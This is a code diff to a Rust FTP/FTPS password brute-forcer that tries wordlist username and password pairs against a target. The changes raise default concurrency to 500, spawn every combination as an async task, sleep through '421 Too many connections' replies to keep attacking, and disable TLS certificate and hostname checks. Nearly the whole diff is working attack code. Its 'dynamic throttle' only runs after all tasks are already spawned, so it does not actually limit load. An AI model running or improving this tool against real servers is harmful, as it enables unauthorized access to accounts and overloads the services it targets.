@@ -4,7 +4,7 @@ use suppaftp::{
     AsyncNativeTlsFtpStream,
     AsyncNativeTlsConnector,
 };
-use suppaftp::async_native_tls::TlsConnector;    // <-- this one!
+use suppaftp::async_native_tls::TlsConnector;
 use std::{
     fs::File,
     io::{BufRead, BufReader, Write},
@@ -12,11 +12,27 @@ use std::{
     sync::Arc,
 };
 use tokio::{sync::Mutex, time::{sleep, Duration}};
-
 use std::path::Path;
+use sysinfo::System;
+use futures::stream::{FuturesUnordered, StreamExt};
 
+async fn dynamic_throttle(running: usize, max_concurrency: usize) {
+    let mut system = System::new_all();
+    system.refresh_all();
 
+    let cpu_usage = system.cpus().iter().map(|cpu| cpu.cpu_usage()).sum::<f32>() / system.cpus().len() as f32;
+    let ram_used = system.used_memory() as f32 / system.total_memory() as f32;
 
+    if cpu_usage > 80.0 || ram_used > 0.8 {
+        sleep(Duration::from_millis(50)).await;
+    } else if cpu_usage > 60.0 || ram_used > 0.6 {
+        sleep(Duration::from_millis(25)).await;
+    } else if running > max_concurrency {
+        sleep(Duration::from_millis(10)).await;
+    } else {
+        sleep(Duration::from_millis(1)).await;
+    }
+}
 
 
 /// Format IPv4 or IPv6 addresses with port
@@ -51,7 +67,7 @@ pub async fn run(target: &str) -> Result<()> {
     let usernames_file = prompt_required("Username wordlist")?;
     let passwords_file = prompt_required("Password wordlist")?;
     let concurrency: usize = loop {
-        let input = prompt_default("Max concurrent tasks", "10")?;
+        let input = prompt_default("Max concurrent tasks", "500")?; // default 500 (higher)
         if let Ok(n) = input.parse::<usize>() {
             if n > 0 { break n }
         }
@@ -75,33 +91,51 @@ pub async fn run(target: &str) -> Result<()> {
     println!("\n[*] Starting brute-force on {}", addr);
 
     let users = load_lines(&usernames_file)?;
-    let passes = {
-        let f = File::open(&passwords_file)?;
-        let buf = BufReader::new(f);
-        buf.lines().filter_map(Result::ok).collect::<Vec<_>>()
-    };
+    let passes = load_lines(&passwords_file)?;
 
-    let mut idx = 0;
-    for pass in passes {
-        if *stop.lock().await { break; }
+    let mut tasks = FuturesUnordered::new();
 
-        let userlist = if combo_mode {
-            users.clone()
-        } else {
-            vec![users.get(idx % users.len()).unwrap_or(&users[0]).to_string()]
-        };
+    if combo_mode {
+        // Every user × every pass
+        for user in &users {
+            for pass in &passes {
+                let addr = addr.clone();
+                let user = user.clone();
+                let pass = pass.clone();
+                let found = Arc::clone(&found);
+                let stop = Arc::clone(&stop);
 
-        let mut handles = Vec::with_capacity(concurrency);
-        for user in userlist {
+                tasks.push(tokio::spawn(async move {
+                    if *stop.lock().await { return; }
+                    match try_ftp_login(&addr, &user, &pass).await {
+                        Ok(true) => {
+                            println!("[+] {} -> {}:{}", addr, user, pass);
+                            found.lock().await.push((addr.clone(), user.clone(), pass.clone()));
+                            if stop_on_success {
+                                *stop.lock().await = true;
+                            }
+                        }
+                        Ok(false) => {
+                            log(verbose, &format!("[-] {} -> {}:{}", addr, user, pass));
+                        }
+                        Err(e) => {
+                            log(verbose, &format!("[!] {}: error: {}", addr, e));
+                        }
+                    }
+                }));
+            }
+        }
+    } else {
+        // Line-by-line (user1 with pass1, user2 with pass2, etc.)
+        for (i, pass) in passes.iter().enumerate() {
+            let user = users.get(i % users.len()).unwrap_or(&users[0]).clone();
             let addr = addr.clone();
-            let user = user.clone();
             let pass = pass.clone();
             let found = Arc::clone(&found);
             let stop = Arc::clone(&stop);
 
-            handles.push(tokio::spawn(async move {
+            tasks.push(tokio::spawn(async move {
                 if *stop.lock().await { return; }
-
                 match try_ftp_login(&addr, &user, &pass).await {
                     Ok(true) => {
                         println!("[+] {} -> {}:{}", addr, user, pass);
@@ -117,19 +151,19 @@ pub async fn run(target: &str) -> Result<()> {
                         log(verbose, &format!("[!] {}: error: {}", addr, e));
                     }
                 }
-
-                sleep(Duration::from_millis(10)).await;
             }));
-
-            if handles.len() >= concurrency {
-                for h in handles.drain(..) { let _ = h.await; }
-            }
         }
-
-        for h in handles { let _ = h.await; }
-        idx += 1;
     }
 
+    // 💥 Here is the correct task runner with dynamic throttling!
+    let mut running = 0;
+while let Some(res) = tasks.next().await {
+    dynamic_throttle(running, concurrency).await;
+    res?;
+    running += 1;
+}
+
+    // After all tasks are finished, print/save results
     let creds = found.lock().await;
     if creds.is_empty() {
         println!("\n[-] No credentials found.");
@@ -151,62 +185,85 @@ pub async fn run(target: &str) -> Result<()> {
     Ok(())
 }
 
-/// Try FTP login and fall back to FTPS if necessary
+
+/// Try FTP login and only fallback to FTPS if "SSL/TLS required" is detected
 async fn try_ftp_login(addr: &str, user: &str, pass: &str) -> Result<bool> {
-    // 1️⃣ Plain FTP
-    if let Ok(mut ftp) = AsyncFtpStream::connect(addr).await {
-        match ftp.login(user, pass).await {
-            Ok(_) => {
-                let _ = ftp.quit().await;
-                return Ok(true);
+    match AsyncFtpStream::connect(addr).await {
+        Ok(mut ftp) => {
+            match ftp.login(user, pass).await {
+                Ok(_) => {
+                    let _ = ftp.quit().await;
+                    return Ok(true);
+                }
+                Err(e) => {
+                    let msg = e.to_string();
+                    if msg.contains("530") {
+                        return Ok(false);
+                    } else if msg.contains("550 SSL/TLS required") {
+                        // fall through
+                    } else if msg.contains("421") {
+                        // 421 Too many connections
+                        println!("[-] 421 Too many connections, sleeping 2 seconds...");
+                        sleep(Duration::from_secs(2)).await;
+                        return Ok(false);
+                    } else {
+                        return Err(anyhow!("FTP error: {}", msg));
+                    }
+                }
             }
-            Err(e) if e.to_string().contains("530") => {
-                // bad creds
+        }
+        Err(e) => {
+            let msg = e.to_string();
+            if msg.contains("550 SSL/TLS required") {
+                // fall through
+            } else if msg.contains("421") {
+                println!("[-] 421 Too many connections, sleeping 2 seconds...");
+                sleep(Duration::from_secs(2)).await;
                 return Ok(false);
+            } else {
+                return Err(anyhow!("FTP connection error: {}", msg));
             }
-            Err(e) if e.to_string().contains("550 SSL/TLS required") => {
-                // server requires FTPS → fall through
-            }
-            Err(e) => return Err(anyhow!("FTP error: {}", e)),
         }
     }
 
-// 2️⃣ FTPS fallback with async-native-tls (no cert/hostname verification)
-let mut ftp_tls = AsyncNativeTlsFtpStream::connect(addr)
-    .await
-    .map_err(|e| anyhow!("FTPS connect failed: {}", e))?;
+    // 2️⃣ Only if needed, try FTPS
+    let mut ftp_tls = AsyncNativeTlsFtpStream::connect(addr)
+        .await
+        .map_err(|e| anyhow!("FTPS connect failed: {}", e))?;
 
-// Build an async-native-tls connector that skips cert & hostname checks
-let connector = AsyncNativeTlsConnector::from(
-    TlsConnector::new()
-        .danger_accept_invalid_certs(true)
-        .danger_accept_invalid_hostnames(true)
-);  // :contentReference[oaicite:0]{index=0} :contentReference[oaicite:1]{index=1}
+    let connector = AsyncNativeTlsConnector::from(
+        TlsConnector::new()
+            .danger_accept_invalid_certs(true)
+            .danger_accept_invalid_hostnames(true),
+    );
 
-// Extract hostname for SNI
-let domain = addr
-    .trim_start_matches('[')
-    .split(&[']', ':'][..])
-    .next()
-    .unwrap_or(addr);
+    let domain = addr
+        .trim_start_matches('[')
+        .split(&[']', ':'][..])
+        .next()
+        .unwrap_or(addr);
 
-// Upgrade to TLS
-ftp_tls = ftp_tls
-    .into_secure(connector, domain)
-    .await
-    .map_err(|e| anyhow!("TLS upgrade failed: {}", e))?;
+    ftp_tls = ftp_tls
+        .into_secure(connector, domain)
+        .await
+        .map_err(|e| anyhow!("TLS upgrade failed: {}", e))?;
 
-
-    // Retry login over FTPS
     match ftp_tls.login(user, pass).await {
         Ok(_) => {
             let _ = ftp_tls.quit().await;
             Ok(true)
         }
-        Err(e) if e.to_string().contains("530") => Ok(false),
-        Err(e) => Err(anyhow!("FTPS error: {}", e)),
+        Err(e) => {
+            let msg = e.to_string();
+            if msg.contains("530") {
+                Ok(false) // Bad login
+            } else {
+                Err(anyhow!("FTPS error: {}", msg))
+            }
+        }
     }
 }
+
 
 // === Helpers ===
 
